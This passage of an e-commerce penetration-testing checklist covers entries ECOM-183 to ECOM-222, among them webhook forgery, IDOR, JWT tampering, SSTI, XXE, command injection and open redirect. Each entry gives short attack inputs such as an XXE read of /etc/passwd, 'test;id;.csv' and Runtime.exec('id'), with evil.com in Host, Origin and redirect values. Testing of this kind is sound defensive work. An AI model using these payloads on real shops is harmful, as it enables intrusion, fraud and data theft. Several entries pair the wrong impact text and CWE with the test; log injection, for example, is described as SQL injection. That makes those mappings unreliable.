**Test Category:** Authentication Bypass · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Analyze payment webhook format 2. Forge webhook notification 3. Mark unpaid orders as paid

**Expected Result:** Webhooks should be cryptographically verified

**Payload Example:**

```
Fake IPN/webhook without signature verification
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ECOM-183 — Loyalty Points Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. View points balance 2. Intercept and modify 3. Redeem more than earned

**Expected Result:** Points should be server-validated

**Payload Example:**

```
{"points_to_redeem":999999} when balance is 100
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-184 — Gift Card Fraud
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Generate gift card 2. Analyze code pattern 3. Predict valid codes

**Expected Result:** Gift card codes should be random

**Payload Example:**

```
Sequential or predictable gift card numbers
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-185 — Affiliate Commission Fraud
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Generate affiliate link 2. Self-refer purchases 3. Earn commission on own orders

**Expected Result:** Self-referral should be detected

**Payload Example:**

```
Use own affiliate link for purchases
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Multiple Accounts

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-186 — Checkout Race Condition
**Test Category:** Race Condition · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Start checkout 2. Concurrent inventory and payment 3. Buy out-of-stock item

**Expected Result:** Inventory and payment should be transactional

**Payload Example:**

```
Race between stock check and payment
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ECOM-187 — Order Modification After Payment
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Complete payment 2. Modify order items 3. Get better items for paid price

**Expected Result:** Orders should be locked after payment

**Payload Example:**

```
Add items after payment confirmation
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-188 — Invoice IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Access own invoice 2. Modify invoice_id 3. Access other customers' invoices

**Expected Result:** Invoice access should verify ownership

**Payload Example:**

```
GET /invoices/victim_invoice_id.pdf
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-189 — Mass Order Enumeration
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Enumerate order IDs 2. Access order details 3. Harvest customer data

**Expected Result:** Order IDs should be unpredictable

**Payload Example:**

```
/orders/1 through /orders/100000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ECOM-190 — Sensitive Data in Order Confirmation
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Complete order 2. Analyze confirmation page 3. Check for sensitive data exposure

**Expected Result:** Confirmation should minimize sensitive data

**Payload Example:**

```
Full credit card number or CVV in response
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-191 — GraphQL E-Commerce Query Abuse
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Introspect GraphQL schema 2. Query restricted fields 3. Access admin product data

**Expected Result:** GraphQL should enforce field-level authorization

**Payload Example:**

```
{ product { cost_price supplier_info } }
```

**Impact:** GraphQL abuse -&gt; introspection/IDOR/batching DoS -&gt; data exposure or availability.

**Tools:** GraphQL Voyager / Altair / Burp Suite

**References:** CWE-400; -&gt;[IDOR / BOLA checklist](#/checklist/idor); OWASP GraphQL Cheat Sheet; PortSwigger

---

## ECOM-192 — API Rate Limit Bypass for Purchasing
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Identify purchase rate limits 2. Bypass via header manipulation 3. Mass purchase limited items

**Expected Result:** Rate limits should be robust

**Payload Example:**

```
X-Forwarded-For rotation for limited drops
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## ECOM-193 — Insecure Direct Object Reference Chain
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Access order 2. Access order's shipping 3. Access shipping's address 4. Access other users' addresses

**Expected Result:** All related objects should verify authorization

**Payload Example:**

```
Chained IDOR: order->shipment->address->user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-194 — Business Logic Workflow Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Map checkout workflow 2. Skip steps (verification/payment) 3. Complete order without payment

**Expected Result:** Workflow should enforce all steps

**Payload Example:**

```
Jump from cart directly to order complete
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## ECOM-195 — Abandoned Cart Data Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Create cart with items 2. Abandon cart 3. Access cart via predictable ID

**Expected Result:** Abandoned carts should not be accessible

**Payload Example:**

```
/cart/abandoned/sequential_id
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-196 — Cross-Tenant Data Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Identify multi-tenant setup 2. Modify tenant identifier 3. Access other store's data

**Expected Result:** Tenant isolation should be enforced

**Payload Example:**

```
X-Tenant-ID manipulation or subdomain switch
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-197 — Webhook Event Replay
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Capture legitimate webhook 2. Replay multiple times 3. Trigger duplicate actions

**Expected Result:** Webhooks should have replay protection

**Payload Example:**

```
Replay payment success webhook for multiple credits
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ECOM-198 — JWT Token Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Decode JWT token 2. Modify claims (user_id/role) 3. Access as different user

**Expected Result:** JWT should properly validate signatures

**Payload Example:**

```
{"alg":"none"} or modify user_id claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## ECOM-199 — Cache Deception on Checkout
**Test Category:** Web Cache Deception · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Append static extension to checkout URL 2. Cache page with sensitive data 3. Access cached page

**Expected Result:** Dynamic pages should not be cached

**Payload Example:**

```
/checkout/payment.css or /cart.js
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## ECOM-200 — HTTP Request Smuggling
**Test Category:** Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Test for CL.TE/TE.CL vulnerabilities 2. Smuggle malicious request 3. Access other users' sessions

**Expected Result:** HTTP parsing should be consistent

**Payload Example:**

```
CL.TE or TE.CL payload
```

**Impact:** HTTP request smuggling -&gt; cache poisoning / auth bypass / request hijacking.

**Tools:** Burp Suite HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); James Kettle HTTP Desync Attacks

---

## ECOM-201 — CORS Misconfiguration on APIs
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Send request with evil Origin 2. Check Access-Control-Allow-Origin 3. Steal data cross-origin

**Expected Result:** CORS should restrict origins

**Payload Example:**

```
Origin: https://evil.com with credentials
```

**Impact:** CORS misconfiguration -&gt; credentialed cross-origin secret theft -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-942; -&gt;[CORS checklist](#/checklist/cors); PortSwigger CORS; Christian Schneider

---

## ECOM-202 — Subdomain Takeover
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Enumerate subdomains 2. Find dangling DNS 3. Takeover abandoned subdomain

**Expected Result:** All subdomains should be configured

**Payload Example:**

```
shop-cdn.company.com pointing to unclaimed S3
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Subjack / Can-I-Take-Over-XYZ

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ECOM-203 — Missing Security Headers
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Analyze response headers 2. Check for missing security headers 3. Exploit missing protections

**Expected Result:** All security headers should be present

**Payload Example:**

```
Missing CSP/X-Frame-Options/HSTS
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Security Headers Scanner / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## ECOM-204 — Verbose Error Messages
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Trigger errors via invalid input 2. Analyze error messages 3. Extract sensitive information

**Expected Result:** Errors should be generic in production

**Payload Example:**

```
Stack traces/SQL errors/internal paths
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Fuzzing

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-205 — Debug Endpoints Exposure
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Enumerate common debug endpoints 2. Access exposed debug functionality 3. Extract sensitive data

**Expected Result:** Debug endpoints should be disabled

**Payload Example:**

```
/debug/vars or /actuator/env or /phpinfo
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-206 — Admin Panel Access
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find admin panel URL 2. Test for default credentials 3. Bypass authentication

**Expected Result:** Admin should require strong authentication

**Payload Example:**

```
/admin with admin:admin or admin:password
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / ffuf / Default Creds

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ECOM-207 — Insecure Deserialization
**Test Category:** Insecure Deserialization · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find serialized data in requests 2. Modify serialized object 3. Achieve RCE

**Expected Result:** Serialization should be avoided or secured

**Payload Example:**

```
PHP/Java/Python serialized payloads
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / phpggc / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## ECOM-208 — Server-Side Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find user input in templates 2. Inject SSTI payload 3. Execute code

**Expected Result:** User input should not be templated

**Payload Example:**

```
{{config}} or ${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap / SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ECOM-209 — Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Submit input that appears in logs 2. Inject log format strings 3. Forge log entries

**Expected Result:** Logs should sanitize user input

**Payload Example:**

```
username=admin%0aFraudulent log entry
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Log Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-210 — Email Header Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find email-sending feature 2. Inject headers in recipient 3. Send spam

**Expected Result:** Email addresses should be validated

**Payload Example:**

```
to=victim@test.com%0aBcc:spam@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / Email Tools

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## ECOM-211 — Host Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Modify Host header 2. Check for URL generation issues 3. Poison password reset links

**Expected Result:** Host header should be validated

**Payload Example:**

```
Host: evil.com in password reset request
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## ECOM-212 — Open Redirect in Checkout
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find redirect parameter 2. Inject external URL 3. Redirect to phishing site

**Expected Result:** Redirects should be validated

**Payload Example:**

```
return_url=https://evil.com/checkout-phish
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## ECOM-213 — LDAP Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find LDAP-backed search 2. Inject LDAP payload 3. Bypass authentication or extract data

**Expected Result:** LDAP queries should be escaped

**Payload Example:**

```
username=*)(uid=*))(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## ECOM-214 — XML External Entity in Order Import
**Test Category:** XML External Entity · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find XML import feature 2. Upload XML with XXE 3. Extract server files

**Expected Result:** XML parsing should disable external entities

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite / XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ECOM-215 — Command Injection in Export
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Find export feature with filename 2. Inject OS command 3. Execute commands

**Expected Result:** Filenames should never be passed to shell

**Payload Example:**

```
filename=test;id;.csv
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## ECOM-216 — Second Order SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Store payload in profile 2. Trigger order process using profile data 3. Execute delayed injection

**Expected Result:** All data usage should be parameterized

**Payload Example:**

```
Address with SQL payload used in shipping query
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ECOM-217 — Mass Assignment on Order
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Create order 2. Add extra parameters 3. Modify order status/total

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"items":[...],status:"shipped",total:0}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## ECOM-218 — Prototype Pollution
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Send JSON with __proto__ 2. Pollute object prototype 3. Exploit polluted properties

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"admin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## ECOM-219 — Denial of Service via Cart
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Add millions of items to cart 2. Trigger cart calculation 3. Exhaust server resources

**Expected Result:** Cart should have item limits

**Payload Example:**

```
Add 1000000 items via script
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ECOM-220 — Information Disclosure via Backup Files
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Enumerate backup files 2. Access exposed backups 3. Extract sensitive data

**Expected Result:** Backup files should not be web-accessible

**Payload Example:**

```
/backup.sql or /db.sql.bak or /.env.backup
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf / dirsearch

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-221 — Timing Attack on Coupon Validation
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Measure response time for valid vs invalid coupons 2. Identify timing differences 3. Enumerate valid coupons

**Expected Result:** Response time should be constant

**Payload Example:**

```
Statistical timing analysis on coupon checks
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ECOM-222 — Insecure Random Number Generation
**Test Category:** Cryptographic Failures · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General E-Commerce Security

**Test Steps:** 1. Analyze generated tokens/codes 2. Identify weak randomness 3. Predict future values

**Expected Result:** Cryptographically secure randomness should be used

**Payload Example:**

```
Predictable order IDs or tokens
```

**Impact:** Weak/broken cryptography -&gt; data exposure, token forgery, integrity bypass.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-327; OWASP Cryptographic Failures (A02); WSTG-CRYP

---
